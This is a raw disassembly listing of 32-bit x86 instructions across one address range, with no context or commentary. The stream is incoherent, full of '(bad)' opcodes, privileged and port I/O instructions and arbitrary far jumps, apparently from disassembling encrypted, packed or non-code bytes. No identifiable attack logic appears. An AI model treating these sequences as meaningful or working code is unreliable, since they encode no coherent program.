  417438:	push   cs
  417439:	sub    BYTE PTR [edx],bh
  41743b:	faddp  st(4),st
  41743d:	mov    cr0,ebx
  417440:	add    BYTE PTR [esi],0xcf
  417443:	and    edi,edi
  417445:	(bad)  
  417446:	adc    DWORD PTR [edi+eax*1-0x5b],ebx
  41744a:	jmp    0xb847:0x8a3f957
  417451:	push   ebx
  417452:	sub    ch,BYTE PTR ss:[esi]
  417455:	mov    edi,0x145242c1
  41745a:	pop    ss
  41745b:	pop    esp
  41745c:	leave  
  41745d:	sbb    ah,BYTE PTR ds:0x3873a408
  417463:	cld    
  417464:	test   al,0xa5
  417466:	loopne 0x417485
  417468:	and    BYTE PTR [edi],ah
  41746a:	cld    
  41746b:	cmp    DWORD PTR ds:0x670e5436,0x55
  417472:	xchg   DWORD PTR [eax-0x50],ebp
  417475:	jmp    0xe07b:0x8b9caa39
  41747c:	outs   dx,BYTE PTR ds:[esi]
  41747d:	and    al,0xa3
  41747f:	inc    edx
  417480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417481:	dec    edx
  417482:	push   eax
  417483:	outs   dx,BYTE PTR ds:[esi]
  417484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417485:	push   ebp
  417486:	or     BYTE PTR [ecx],cl
  417488:	push   ebx
  417489:	and    al,0xcd
  41748b:	test   BYTE PTR [ecx],al
  41748d:	out    0xdc,eax
  41748f:	adc    BYTE PTR [esp+ebx*1+0x346c745f],0xcc
  417497:	pop    esi
  417499:	xor    edi,DWORD PTR [edi+0x62]
  41749c:	or     bh,al
  41749e:	fadd   QWORD PTR [edi-0x24]
  4174a1:	mov    bl,0xa4
  4174a3:	nop
  4174a4:	lahf   
  4174a5:	jb     0x4174a4
  4174a7:	fcmovnb st,st(7)
  4174a9:	and    eax,0x99766297
  4174ae:	xor    ch,BYTE PTR [esi-0x62]
  4174b1:	pushf  
  4174b2:	dec    ebp
  4174b3:	sub    ecx,DWORD PTR [esi]
  4174b5:	xor    DWORD PTR ds:[ebp+eax*4+0x7a],esi
  4174ba:	test   BYTE PTR [ebp+0x4],ch
  4174bd:	add    DWORD PTR [edx-0x21f9187c],esp
  4174c3:	icebp  
  4174c4:	inc    eax
  4174c5:	jecxz  0x417509
  4174c7:	dec    ebp
  4174c8:	mov    ds:0xf20552ec,eax
  4174cd:	push   eax
  4174ce:	sbb    eax,0x1501e39d
  4174d3:	jne    0x41749c
  4174d5:	scas   eax,DWORD PTR es:[edi]
  4174d6:	ins    BYTE PTR es:[edi],dx
  4174d7:	push   edi
  4174d8:	xchg   ebp,eax
  4174d9:	lea    edx,[ebp-0x502b4b1d]
  4174df:	jnp    0x41749b
  4174e1:	and    esp,DWORD PTR [edx-0x3ee5a3b3]
  4174e7:	out    dx,eax
  4174e8:	js     0x417502
  4174ea:	and    esi,DWORD PTR [ebx+0x46]
  4174ed:	shr    DWORD PTR [edi+ebp*1-0x7af67510],0x59
  4174f5:	stc    
  4174f6:	cmp    eax,0x4ca4840f
  4174fb:	lods   al,BYTE PTR ds:[esi]
  4174fc:	cmp    eax,0xdd349dda
  417501:	addr16 xchg edi,eax
  417503:	jb     0x41756e
  417505:	pushf  
  417506:	mov    dh,0xb0
  417508:	mov    esi,0xd0490f5b
  41750d:	xchg   DWORD PTR [ebp-0x1f688a41],ebp
  417513:	mov    dh,BYTE PTR [ebx-0x2bbead12]
  417519:	mov    ebp,0xde2bf65a
  41751e:	inc    esp
  41751f:	ret    
  417520:	imul   edx,DWORD PTR [edi],0x6af6909a
  417526:	mov    ebx,0xaff7655d
  41752b:	hlt    
  41752c:	jge    0x41758b
  41752e:	(bad)  
  41752f:	call   0x3048ac29
  417534:	cmp    bl,BYTE PTR [esi-0x4a]
  417537:	xor    al,0x48
  417539:	jecxz  0x417501
  41753b:	inc    ebx
  41753c:	lods   eax,DWORD PTR ds:[si]
  41753e:	fnstcw WORD PTR [esp+edi*8]
  417541:	or     dh,dl
  417543:	pop    ds
  417544:	lds    esp,FWORD PTR [esi+0xbc25c53]
  41754a:	xor    al,0xc6
  41754c:	test   BYTE PTR [esi-0x4d],cl
  41754f:	pushf  
  417550:	xchg   edx,eax
  417551:	out    dx,al
  417552:	retf   0xf219
  417555:	push   ds
  417556:	pushf  
  417557:	js     0x4174e6
  417559:	inc    esi
  41755a:	sbb    eax,0xe06e006d
  41755f:	arpl   WORD PTR [edi+0x4e],di
  417562:	add    eax,DWORD PTR [edx-0x5d]
  417565:	daa    
  417566:	inc    esp
  417567:	pop    esi
  417568:	xchg   ebp,eax
  417569:	shr    DWORD PTR [eax],0xca
  41756c:	and    BYTE PTR [ecx+esi*1],dh
  41756f:	shr    BYTE PTR [ecx+ebx*4],cl
  417572:	fnstenv [ebx+0x71]
  417575:	ret    
  417576:	dec    ebp
  417577:	js     0x4175dd
  417579:	stos   DWORD PTR es:[edi],eax
  41757a:	or     al,BYTE PTR [edi-0x62]
  41757d:	clc    
  41757e:	mov    al,ds:0x8ca61966
  417583:	or     eax,edi
  417585:	iret   
  417586:	jecxz  0x41757e
  417588:	(bad)  
  417589:	xor    BYTE PTR [esi-0x2a],bl
  41758c:	pop    ds
  41758d:	data16 gs (bad) 
  417590:	fucomi st,st(7)
  417592:	(bad)  
  417593:	xor    bh,dh
  417595:	or     cl,0x36
  417598:	inc    ebx
  417599:	mov    edx,DWORD PTR [edi+0x1d]
  41759c:	push   ebx
  41759d:	lock cmc 
  41759f:	cli    
  4175a0:	push   eax
  4175a1:	mov    eax,0x2cd8199f
  4175a6:	iret   
  4175a7:	xchg   DWORD PTR [ebx],eax
  4175a9:	retf   
  4175aa:	popf   
  4175ab:	mov    ?,WORD PTR [ecx]
  4175ad:	cdq    
  4175ae:	rcl    BYTE PTR [eax+0x4da909d6],cl
  4175b4:	inc    esi
  4175b5:	pop    ds
  4175b6:	dec    ebx
  4175b7:	jnp    0x41760b
  4175b9:	jl     0x41761e
  4175bb:	inc    eax
  4175bc:	(bad)  
  4175bd:	lds    eax,FWORD PTR [eax+ebp*4]
  4175c0:	mov    ds:0xf5d9098a,eax
  4175c5:	sub    eax,DWORD PTR [ebx]
  4175c7:	push   es
  4175c8:	adc    bh,BYTE PTR [edi]
  4175ca:	mov    edx,DWORD PTR [eax-0x1ccfb1dc]
  4175d0:	xchg   edi,eax
  4175d1:	gs xchg ebp,eax
  4175d3:	mov    edx,0xb88f09b8
  4175d8:	mov    ecx,0xf373e4aa
  4175dd:	test   eax,0xeab811f
  4175e2:	sbb    cl,BYTE PTR [eax]
  4175e4:	repz les dx,DWORD PTR [edx-0x410e1a46]
  4175ec:	inc    edi
  4175ed:	jnp    0x417572
  4175ef:	es ja  0x4175b5
  4175f2:	ret    
  4175f3:	jecxz  0x417628
  4175f5:	(bad)  
  4175f6:	jmp    0xe0377870
  4175fb:	das    
  4175fc:	outs   dx,DWORD PTR ds:[esi]
  4175fd:	xchg   ecx,eax
  4175fe:	jecxz  0x417671
  417600:	pop    edx
  417601:	not    bl
  417603:	mov    esp,0xd93f0215
  417608:	xchg   BYTE PTR [edx+0xa00168a],ch
  41760e:	cdq    
  41760f:	adc    al,0x70
  417611:	jmp    0x171c:0xb8eef07a
  417618:	icebp  
  417619:	cmp    edx,esp
  41761b:	icebp  
  41761c:	mov    ch,ah
  41761e:	jne    0x4175bd
  417620:	or     al,0x37
  417622:	repnz inc esi
  417624:	mov    si,0xb1ff
  417628:	pop    edi
  417629:	icebp  
  41762a:	popa   
  41762b:	bound  edi,QWORD PTR [ecx+0x1b]
  41762e:	dec    ebp
  41762f:	mov    ecx,0xb1c8a63c
  417634:	es (bad) 
  417636:	aam    0xb5
  417638:	cmc    
  417639:	lods   eax,DWORD PTR ds:[esi]
  41763a:	pop    edx
  41763b:	sbb    eax,edx
  41763d:	test   DWORD PTR [ebp+eax*8+0xe],edx
  417641:	xor    DWORD PTR [edi-0x32],esi
  417644:	cwde   
  417645:	repz test DWORD PTR [ecx+0x73],esi
  417649:	cmp    BYTE PTR [edx-0x154eab51],al
  41764f:	stos   DWORD PTR es:[edi],eax
  417650:	call   0xea51ed06
  417655:	ret    0xf0db
  417658:	pop    esp
  417659:	add    al,0x18
  41765b:	mov    al,0x7a
  41765d:	leave  
  41765e:	add    DWORD PTR [eax+0x784bda60],ebp
  417664:	dec    ebp
  417665:	sahf   
  417666:	pop    ebx
  417667:	jmp    0x7e739a0
  41766c:	add    al,0x8a
  41766e:	shl    DWORD PTR [esi],0xe8
  417671:	jb     0x41766d
  417673:	sbb    bl,BYTE PTR [eax+0x4394811e]
  417679:	scas   al,BYTE PTR es:[edi]
  41767a:	xchg   ecx,eax
  41767b:	mov    bh,0x11
  41767d:	shl    BYTE PTR [esi+0x20e92ab2],0x5d
  417684:	jl     0x41764b
  417686:	cmp    BYTE PTR [eax+edx*4],cl
  417689:	leave  
  41768a:	or     al,0x22
  41768d:	jle    0x41770b
  41768f:	pop    edx
  417690:	(bad)  
  417691:	test   eax,0xcfc7a7ab
  417696:	shl    DWORD PTR [edx],cl
  417698:	jnp    0x4176ea
  41769a:	push   eax
  41769b:	xor    cl,dl
  41769d:	jle    0x417653
  41769f:	mov    gs,WORD PTR [ecx+0x0]
  4176a2:	xchg   ecx,eax
  4176a3:	icebp  
  4176a4:	shr    DWORD PTR [ebx+0x479558c3],0x6d
  4176ab:	(bad)
  4176ae:	pop    esi
  4176af:	pop    ss
  4176b0:	test   al,0x60
  4176b2:	jno    0x41769a
  4176b4:	fstp   st(7)
  4176b6:	neg    DWORD PTR [eax+0x45c3389]
  4176bc:	outs   dx,BYTE PTR ds:[esi]
  4176bd:	mov    esp,0x28e58d0e
  4176c2:	jmp    0x5efa:0x47463ef3
  4176c9:	shl    BYTE PTR ss:[edi],0x90
  4176cd:	adc    bl,BYTE PTR [edi]
  4176cf:	int3   
  4176d0:	int3   
  4176d1:	xor    BYTE PTR [eax-0x7c],cl
  4176d4:	lahf   
  4176d5:	popf   
  4176d6:	inc    ecx
  4176d7:	jnp    0x417754
  4176d9:	(bad)
  4176dd:	or     al,0x78
  4176df:	cmp    DWORD PTR [esi],eax
  4176e1:	cs mov ch,0xfc
  4176e4:	fcomp  st(0)
  4176e6:	das    
  4176e7:	dec    esi
  4176e8:	imul   eax,DWORD PTR [ebp+0x23],0x22fdaef1
  4176ef:	scas   al,BYTE PTR es:[edi]
  4176f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176f2:	push   0xffffffed
  4176f4:	xor    eax,0x8e0afeda
  4176f9:	pop    esp
  4176fa:	xor    edx,0xffffff9c
  4176fd:	fst    DWORD PTR [eax]
  4176ff:	cs jmp 0x4176e4
  417702:	aas    
  417703:	jae    0x417778
  417705:	out    dx,eax
  417706:	lods   eax,DWORD PTR ds:[esi]
  417707:	push   esp
  417708:	sub    esi,DWORD PTR [esi]
  41770a:	pusha  
  41770b:	ret    
  41770c:	(bad)  
  41770d:	mov    DWORD PTR [esi+0x2526d4b],esp
  417713:	push   es
  417714:	lahf   
  417715:	imul   ebp,ecx,0xcc3b8aa3
  41771b:	sub    eax,0x21692ac4
  417720:	mov    al,ds:0xf0f48da8
  417725:	lahf   
  417726:	jp     0x41770e
  417728:	test   al,0xd0
  41772a:	inc    esp
  41772b:	mov    esi,0x8d99f0a4
  417730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417731:	sub    al,0x4a
  417733:	daa    
  417734:	mov    ds,WORD PTR [edi]
  417736:	loopne 0x41773e
  417738:	or     dl,BYTE PTR [esi-0x6b]
  41773b:	pop    ebp
  41773c:	inc    ecx
  41773d:	mov    DWORD PTR [ebp-0x3a],edx
  417740:	repnz popf 
  417742:	jno    0x417743
  417744:	aad    0x69
  417746:	inc    esp
  417747:	retf   0x1f0c
  41774a:	xor    BYTE PTR [eax+eiz*4],bh
  41774d:	pop    esi
  41774e:	div    DWORD PTR [ebx]
  417750:	mov    esi,0x1dc60693
  417755:	push   ss
  417756:	adc    dh,dh
  417758:	retf   0x2aa5
  41775b:	push   es
  41775c:	mov    ecx,0xaa8e8c0d
  417761:	inc    ecx
  417762:	pop    ds
  417763:	push   ebp
  417764:	cmp    ch,BYTE PTR [ecx]
  417766:	sub    DWORD PTR [ecx-0x3b],esp
  417769:	test   eax,0x6f958185
  41776e:	jns    0x4177d4
  417770:	imul   WORD PTR [ecx+0x41]
  417774:	sbb    al,0xa
  417776:	or     ebp,eax
  417778:	ins    BYTE PTR es:[edi],dx
  417779:	aas    
  41777a:	sbb    BYTE PTR [edx],al
  41777c:	retf   0xbff2
  41777f:	mov    esi,0x11f04823
  417784:	pop    esp
  417785:	sub    DWORD PTR [edi+eax*2],0x65
  417789:	xor    al,0xee
  41778b:	push   edi
  41778c:	call   0xbe28dbe2
  417791:	lods   al,BYTE PTR ds:[esi]
  417792:	jno    0x417783
  417794:	shl    BYTE PTR [ecx-0x39b0bdb],1
  41779a:	popa   
  41779b:	rcr    BYTE PTR [edi-0x28ee4afe],1
  4177a1:	mov    ds:0xbf4367e9,al
  4177a6:	add    DWORD PTR ds:0xf1e0507e,esi
  4177ac:	rcr    BYTE PTR [ebp-0x47],1
  4177af:	aad    0x5d
  4177b1:	dec    edi
  4177b2:	mov    dl,0xf0
  4177b4:	call   0x20d539fa
  4177b9:	fs mov eax,0xd6a95eca
  4177bf:	leave  
  4177c0:	dec    ebx
  4177c1:	sar    BYTE PTR [ecx],0x62
  4177c4:	jbe    0x41779c
  4177c6:	cs jae 0x4177b3
  4177c9:	loope  0x4177c5
  4177cb:	inc    esp
  4177cc:	sub    edi,DWORD PTR [edx+0x264bb73b]
  4177d2:	lods   eax,DWORD PTR ds:[esi]
  4177d3:	xor    al,0x1b
  4177d5:	stos   BYTE PTR es:[edi],al
  4177d6:	push   ebx
  4177d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177d8:	lds    eax,FWORD PTR [eax]
  4177da:	test   DWORD PTR [eax],0xcda9e068
  4177e0:	push   0x6f
  4177e2:	scas   eax,DWORD PTR es:[edi]
  4177e3:	dec    ebx
  4177e4:	loopne 0x4177c5
  4177e6:	mov    eax,ds:0xc4912d5f
  4177eb:	retf   
  4177ec:	xlat   BYTE PTR ds:[ebx]
  4177ed:	xchg   ecx,eax
  4177ee:	mov    ebp,0xdb66181a
  4177f3:	je     0x4177c7
  4177f5:	cmp    DWORD PTR [ebp-0x3a81ff00],esi
  4177fb:	loop   0x4177d4
  4177fd:	jg     0x41780b
  4177ff:	xchg   BYTE PTR [ecx-0x69],ch
  417802:	fnstcw WORD PTR [edi]
  417804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417805:	jle    0x4177ff
  417807:	aaa    
  417808:	test   eax,0x7f1c554b
  41780d:	mov    ebx,0x9ac2fa71
  417812:	loop   0x4177d6
  417814:	aam    0x31
  417816:	mov    edi,0xf3c384af
  41781b:	push   0xf52d1e96
  417820:	and    al,BYTE PTR [eax-0xf]
  417823:	out    dx,al
  417824:	jp     0x417809
  417826:	outs   dx,DWORD PTR ds:[esi]
  417827:	iret   
  417828:	dec    esp
  417829:	mov    ebp,0x8c8391ae
  41782e:	loope  0x4177d5
  417830:	inc    ecx
  417831:	loop   0x41785c
  417833:	mov    ah,0x86
  417835:	aaa    
  417836:	into   
  417837:	icebp  
  417838:	jno    0x4177c7
  41783a:	dec    ebp
  41783b:	dec    ecx
  41783c:	mov    al,0xc7
  41783e:	mov    ds:0xa6c55a1d,al
  417843:	aam    0x64
  417845:	mov    al,cl
  417847:	lods   al,BYTE PTR ds:[esi]
  417848:	aam    0x5e
  41784a:	es inc ebx
  41784c:	loopne 0x417860
  41784e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41784f:	sbb    cl,BYTE PTR [edi-0x4fdaffbf]
  417855:	dec    edx
  417856:	cmp    DWORD PTR ds:0xdac6c3a8,0x3deb5cf
  417860:	push   ecx
  417861:	or     BYTE PTR [esi+edx*4+0x4f],al
  417865:	clc    
  417866:	sbb    DWORD PTR [edx],esi
  417868:	mov    ebx,ss
  41786a:	sub    esi,ebp
  41786c:	shl    BYTE PTR [edi-0x71d923c5],1
  417872:	pop    ds
  417873:	xchg   edi,eax
  417874:	xor    ch,bh
  417876:	ror    DWORD PTR [eax],1
  417878:	push   edi
  417879:	jne    0x41782e
  41787b:	sbb    esp,DWORD PTR [eax+0x21]
  41787e:	or     edx,DWORD PTR [eax]
  417880:	push   0x6bd1b710
  417885:	repnz out dx,eax
  417887:	mov    ds:0xf02b8a33,eax
  41788c:	adc    esi,DWORD PTR [eax+0x581a96c3]
  417892:	sub    ebp,DWORD PTR [eax]
  417894:	xchg   ecx,eax
  417895:	xor    BYTE PTR [edx+0x5fd19eef],dh
  41789b:	repz jp 0x41789d
  41789e:	pop    eax
  41789f:	(bad)  
  4178a0:	dec    esi
  4178a1:	xor    ax,0xbb5a
  4178a5:	test   eax,0xc008ab94
  4178aa:	jg     0x417834
  4178ac:	shr    BYTE PTR [edx+0x7a43da0],1
  4178b2:	dec    edx
  4178b3:	call   0xce8169c
  4178b8:	xchg   ebp,eax
  4178b9:	into   
  4178ba:	xchg   ecx,eax
  4178bb:	adc    eax,0xe8838645
  4178c1:	pop    ebp
  4178c2:	pop    esi
  4178c3:	push   bp
  4178c5:	xor    dh,BYTE PTR [ecx-0x20]
  4178c8:	dec    ebp
  4178c9:	popf   
  4178ca:	ret    
  4178cb:	add    edx,0xa94cb944
  4178d1:	ret    0xba16
  4178d4:	cmp    ebx,edi
  4178d6:	div    DWORD PTR [edi-0x71]
  4178d9:	outs   dx,BYTE PTR ds:[esi]
  4178da:	scas   al,BYTE PTR es:[edi]
  4178db:	jo     0x41787a
  4178dd:	mov    BYTE PTR [ecx],cl
  4178df:	sub    ebp,DWORD PTR [edi+0x3db95a24]
  4178e5:	rcr    DWORD PTR [edi],1
  4178e7:	cld    
  4178e8:	mov    edi,0x2629afa9
  4178ed:	mov    BYTE PTR [ebx+0x2b],ah
  4178f0:	adc    eax,0xeef6e26c
  4178f5:	add    ecx,esp
  4178f7:	cli    
  4178f8:	int    0xbc
  4178fa:	or     ch,BYTE PTR [edx]
  4178fc:	adc    al,BYTE PTR [eax+0x6003359a]
  417902:	push   eax
  417903:	add    ch,BYTE PTR [esi]
  417905:	daa    
  417906:	ja     0x417947
  417908:	outs   dx,DWORD PTR ds:[esi]
  417909:	out    dx,eax
  41790a:	cli    
  41790b:	push   ss
  41790c:	adc    eax,0xdf1c744d
  417911:	retf   
  417912:	add    BYTE PTR [ebp+0x3a],bl
  417915:	push   edx
  417916:	in     al,0x54
  417918:	dec    esi
  417919:	and    dh,ah
  41791b:	stos   DWORD PTR es:[edi],eax
  41791c:	cmp    DWORD PTR [eax+0x7a],ecx
  41791f:	sahf   
  417920:	rcpps  xmm4,XMMWORD PTR [ebp-0xa]
  417924:	push   0x869846c3
  417929:	xor    eax,0xcead1e82
  41792e:	xlat   BYTE PTR ds:[ebx]
  41792f:	aas    
  417930:	mov    WORD PTR [edx-0x1c],ds
  417933:	ja     0x41794a
  417935:	pop    edx
  417936:	xchg   ecx,eax
  417937:	lods   eax,DWORD PTR ds:[esi]
  417938:	inc    ebx
  417939:	test   DWORD PTR ds:0xd5858dae,ebp
  41793f:	mov    bl,0xa9
  417941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417942:	(bad)  
  417943:	int3   
  417944:	cmp    al,0xa0
  417946:	ror    BYTE PTR [ebx+esi*2-0x73],1
  41794a:	test   eax,0x50a28cd7
  41794f:	or     eax,0x8f5a1f53
  417954:	sbb    dl,BYTE PTR [ebp-0x48]
  417957:	shr    BYTE PTR [ebx-0x37bba3a0],0x89
  41795e:	adc    al,0xf7
  417960:	push   ecx
  417961:	xchg   BYTE PTR [edi+0x18],ch
  417964:	lock pushf 
  417966:	mov    WORD PTR [edi],ds
  417968:	xchg   DWORD PTR [edi-0x5b],ebx
  41796b:	fld    QWORD PTR [ecx]
  41796d:	pop    esi
  41796e:	push   es
  41796f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417970:	or     eax,DWORD PTR ds:0x2d3f337a
  417976:	inc    ecx
  417977:	ins    BYTE PTR es:[edi],dx
  417978:	or     eax,0x2b56d559
  41797d:	sbb    ecx,DWORD PTR [edi-0x1]
  417980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417981:	loop   0x417917
  417983:	or     al,0x33
  417985:	cwde   
  417986:	int    0x50
  417988:	or     cl,ah
  41798a:	mov    ?,WORD PTR [ecx-0x35]
  41798d:	dec    esi
  41798e:	fcomp  QWORD PTR [eax-0x65]
  417991:	adc    BYTE PTR [edx-0x7d],ah
  417994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417995:	rcr    DWORD PTR [edx],cl
  417997:	into   
  417998:	add    bh,BYTE PTR [edi]
  41799a:	rol    BYTE PTR [ebp-0x52dfd23d],1
  4179a0:	lock enter 0xe87b,0xfc
  4179a5:	xchg   ebp,eax
  4179a6:	nop
  4179a7:	adc    ch,BYTE PTR [ebx+0x58]
  4179aa:	div    BYTE PTR [edx]
  4179ac:	adc    DWORD PTR [eax-0x18],ecx
  4179af:	push   eax
  4179b0:	in     eax,0xca
  4179b2:	out    0x50,al
  4179b4:	pushf  
  4179b5:	push   0x5aaa714f
  4179ba:	fwait
  4179bb:	lahf   
  4179bc:	adc    eax,0xc61411aa
  4179c1:	xchg   BYTE PTR [edx],ch
  4179c3:	repz hlt 
  4179c5:	(bad)  
  4179c7:	js     0x4179db
  4179c9:	xchg   edi,edx
  4179cb:	in     al,dx
  4179cc:	cmp    bh,BYTE PTR [ebx-0x35]
  4179cf:	scas   eax,DWORD PTR es:[edi]
  4179d0:	add    eax,0xc4cd794
  4179d5:	push   edi
  4179d6:	outs   dx,DWORD PTR ds:[esi]
  4179d7:	sbb    dh,BYTE PTR [edx]
  4179d9:	hlt    
  4179da:	ins    DWORD PTR es:[edi],dx
  4179db:	pushf  
  4179dc:	cwde   
  4179dd:	(bad)
  4179e0:	(bad)  
  4179e1:	lods   eax,DWORD PTR ds:[esi]
  4179e2:	(bad)  
  4179e3:	leave  
  4179e4:	xchg   ebx,eax
  4179e5:	push   esi
  4179e6:	and    al,0x30
  4179e8:	std    
  4179e9:	inc    ecx
  4179ea:	sar    DWORD PTR [esi],cl
  4179ec:	cmp    eax,0xe0e4cebc
  4179f1:	push   edx
  4179f2:	fadd   QWORD PTR [edi+0x639bdb6b]
  4179f8:	sbb    BYTE PTR [ebx+ebp*8-0x25],0xe2
  4179fd:	repz push esi
  4179ff:	dec    ecx
  417a00:	push   edi
  417a01:	rcl    DWORD PTR [edi+ecx*4+0x3dcbd8d6],cl
  417a08:	or     BYTE PTR [ebx+eiz*4+0x11260743],cl
  417a0f:	adc    eax,0x2594f7dc
  417a14:	ja     0x417a7f
  417a16:	inc    ebp
  417a17:	mov    bh,0xdf
  417a19:	xchg   ebp,eax
  417a1a:	icebp  
  417a1b:	jo     0x417a8e
  417a1d:	jae    0x417a13
  417a1f:	push   edx
  417a20:	cmp    BYTE PTR [ecx-0x3d10532f],al
  417a26:	shr    DWORD PTR [edi+0x7c212ddf],1
  417a2c:	xchg   edx,eax
  417a2d:	fwait
  417a2e:	sahf   
  417a2f:	in     eax,0xed
  417a31:	mov    ds:0xd7a9fb17,eax
  417a36:	jp     0x417a72
  417a38:	dec    esp
  417a39:	into   
  417a3a:	pop    edx
  417a3b:	mov    ds:0x19d17a96,al
  417a40:	adc    al,0x50
  417a42:	sub    ecx,esi
  417a44:	push   edi
  417a45:	and    eax,0xb1600e59
  417a4a:	mov    edi,0x25b10a9d
  417a4f:	(bad)  
  417a50:	jg     0x417a8c
  417a52:	mov    ecx,esi
  417a54:	mov    bh,BYTE PTR [ecx]
  417a56:	add    BYTE PTR [ecx],ch
  417a58:	loopne 0x417a1f
  417a5a:	dec    edi
  417a5b:	mov    ds:0x3111d138,al
  417a60:	push   ss
  417a61:	es pop ebx
  417a63:	fdivr  QWORD PTR [ebx-0x4f45dd78]
  417a69:	inc    ecx
  417a6a:	mov    eax,ds:0x6807b4ca
  417a6f:	push   es
  417a70:	mov    edi,0x5f3d0a42
  417a75:	inc    ebp
  417a76:	stos   BYTE PTR es:[edi],al
  417a77:	sbb    dl,BYTE PTR [ecx+edx*4-0x32]
  417a7b:	jl     0x417a77
  417a7d:	(bad)  
  417a7e:	mov    edi,0xe3486379
  417a83:	(bad)  
  417a85:	mov    dl,0x40
  417a87:	push   es
  417a88:	inc    edx
  417a89:	pop    edi
  417a8a:	pop    ebx
  417a8b:	sbb    al,0xf3
  417a8d:	retf   0xf588
  417a90:	inc    ebx
  417a91:	aad    0xfe
  417a93:	adc    bl,bl
  417a95:	dec    ecx
  417a96:	aaa    
  417a97:	test   eax,0xd521dfb9
  417a9c:	ins    DWORD PTR es:[edi],dx
  417a9d:	int3   
  417a9e:	into   
  417a9f:	pop    ebx
  417aa0:	(bad)  
  417aa1:	in     al,dx
  417aa2:	(bad)  
  417aa3:	in     al,0xfe
  417aa5:	fist   DWORD PTR [edi+0x6275c90c]
  417aab:	jl     0x417a93
  417aad:	cmp    edi,DWORD PTR [ecx-0x38]
  417ab0:	dec    eax
  417ab1:	jl     0x417b02
  417ab3:	push   ebx
  417ab4:	and    al,0xee
  417ab6:	out    dx,al
  417ab7:	mov    esp,0x70c8df2
  417abc:	fild   WORD PTR [edi]
  417abe:	test   bl,0xcc
  417ac1:	ja     0x417ab1
  417ac3:	out    0xd1,al
  417ac5:	fisub  WORD PTR [ecx-0x76bc9b94]
  417acb:	adc    eax,0x2411823
  417ad0:	int    0x0
  417ad2:	push   ecx
  417ad3:	xchg   esi,eax
  417ad4:	icebp  
  417ad5:	or     eax,0x66990086
  417ada:	pop    ebp
  417adb:	ins    DWORD PTR es:[edi],dx
  417adc:	xlat   BYTE PTR ds:[ebx]
  417add:	lock sbb al,0x73
  417ae0:	iret   
  417ae1:	ret    
  417ae2:	ins    DWORD PTR es:[edi],dx
  417ae3:	mov    bl,0xda
  417ae5:	ficom  WORD PTR [edi-0x1bb379b6]
  417aeb:	es scas al,BYTE PTR es:[edi]
  417aed:	xor    dh,BYTE PTR [ebp-0x5a]
  417af0:	pusha  
  417af1:	and    bl,BYTE PTR [ecx-0x53366a44]
  417af7:	dec    ebp
  417af8:	sar    BYTE PTR [edi+0x47],cl
  417afb:	mov    al,ds:0xccf85db8
  417b00:	pusha  
  417b01:	rcr    DWORD PTR [eax+0x32],cl
  417b04:	mov    DWORD PTR [ebp-0x6a],edx
  417b07:	(bad)  
  417b08:	xlat   BYTE PTR ds:[ebx]
  417b09:	sbb    al,0x39
  417b0b:	(bad)  
  417b0c:	cmp    al,0xce
  417b0e:	jbe    0x417a9f
  417b10:	and    cl,0x1a
  417b13:	in     eax,dx
  417b14:	and    ecx,esp
  417b16:	pop    ss
  417b17:	js     0x417a9f
  417b19:	daa    
  417b1a:	ss call 0x9f20:0xfa5d7d0a
  417b22:	fidiv  WORD PTR [eax+ebx*4]
  417b25:	add    ch,bl
  417b27:	sbb    al,0xe1
  417b29:	fidiv  DWORD PTR [edx+0x4b3d83a5]
  417b2f:	(bad)  
  417b31:	xor    esi,eax
  417b33:	daa    
  417b34:	shl    DWORD PTR [ecx+0x10],0x74
  417b38:	pop    esp
  417b39:	add    eax,DWORD PTR [edx]
  417b3b:	sti    
  417b3c:	test   eax,0xa1f4be0b
  417b41:	xlat   BYTE PTR ds:[ebx]
  417b42:	cmp    DWORD PTR [edi],0xffffffce
  417b45:	dec    ch
  417b47:	pushf  
  417b48:	xlat   BYTE PTR es:[ebx]
  417b4a:	loop   0x417b69
  417b4c:	or     DWORD PTR [ecx+ebx*1],esi
  417b4f:	jno    0x417b80
  417b51:	jecxz  0x417b6e
  417b53:	mov    dl,bh
  417b55:	pusha  
  417b56:	push   ecx
  417b57:	inc    esp
  417b58:	inc    eax
  417b59:	sub    al,0x6b
  417b5b:	loop   0x417b61
  417b5d:	rol    DWORD PTR [edi],cl
  417b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b60:	cwde   
  417b61:	aam    0xab
  417b63:	cwde   
  417b64:	sub    BYTE PTR [edx],bl
  417b66:	push   edx
  417b67:	imul   ebp,ebx,0xeecf4de8
  417b6d:	xlat   BYTE PTR ds:[ebx]
  417b6e:	or     edi,DWORD PTR [ebx+0x195dff38]
  417b74:	sbb    al,0x50
  417b76:	dec    eax
  417b77:	test   al,0x3b
  417b79:	imul   esi,DWORD PTR [ebp+0x1e],0x3ca94a25
  417b80:	das    
  417b81:	sub    ecx,ebp
  417b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b84:	jp     0x417b47
  417b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b87:	sub    al,0xa3
  417b89:	pop    ss
  417b8a:	(bad)  
  417b8b:	cmp    al,0x15
  417b8d:	xchg   edi,eax
  417b8e:	cmc    
  417b8f:	or     al,0x1f
  417b91:	mov    cl,dl
  417b93:	jecxz  0x417b89
  417b95:	pop    esp
  417b96:	or     ah,BYTE PTR [esi+0x3b]
  417b99:	gs xchg edi,eax
  417b9b:	push   ebx
  417b9c:	xor    ah,BYTE PTR [esi+0x6d386040]
  417ba2:	xor    BYTE PTR [esi+0x54],0xa8
  417ba6:	mov    esp,0xb22c0a6d
  417bab:	sbb    BYTE PTR [edi+0x7e],0x79
  417baf:	add    al,0x26
  417bb1:	scas   al,BYTE PTR es:[edi]
  417bb2:	push   ebx
  417bb3:	pop    edi
  417bb4:	(bad)  
  417bb5:	jecxz  0x417be0
